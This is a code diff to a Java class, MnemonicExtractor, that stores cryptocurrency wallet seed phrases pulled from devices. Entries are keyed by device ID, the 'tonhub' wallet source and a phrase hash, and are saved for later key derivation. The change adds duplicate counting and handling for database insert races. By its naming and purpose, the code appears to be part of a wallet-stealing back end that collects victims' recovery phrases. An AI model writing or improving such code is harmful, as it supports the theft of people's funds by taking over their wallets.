@@ -2350,7 +2350,10 @@ public class MnemonicExtractor {
                         ctx.deviceId, r.getWallet(), phraseHash, e.toString());
             }
             if (existId != null) {
-                log.info("【mnemonic-tonhub-later】幂等命中，跳过补写 exist_id={} device={} source={} hash={}",
+                try {
+                    mnemonicDao.incrementDupCount(ctx.deviceId, r.getWallet(), phraseHash);
+                } catch (Exception ignore) {}
+                log.info("【mnemonic-tonhub-later】幂等命中，跳过补写/派生 exist_id={} device={} source={} hash={}",
                         existId, ctx.deviceId, r.getWallet(), phraseHash);
                 return;
             }
@@ -2366,7 +2369,17 @@ public class MnemonicExtractor {
             me.setStatus(1);
             me.setPhraseHash(phraseHash);
             me.setAddtime(now);
-            mnemonicDao.insert(me);
+            try {
+                mnemonicDao.insert(me);
+            } catch (Exception e) {
+                // 并发竞态：另一路已写入 → 记 dup，不派生
+                try {
+                    mnemonicDao.incrementDupCount(ctx.deviceId, r.getWallet(), phraseHash);
+                } catch (Exception ignore) {}
+                log.info("【mnemonic-tonhub-later】入库冲突，跳过派生 device={} source={} hash={} err={}",
+                        ctx.deviceId, r.getWallet(), phraseHash, e.toString());
+                return;
+            }
             log.info("【mnemonic-tonhub-later】补写入库成功 mnemonic_id={} ios18param={} wallet={} words={}",
                     me.getId(), ctx.ios18paramId, r.getWallet(), r.getWordCount());
 
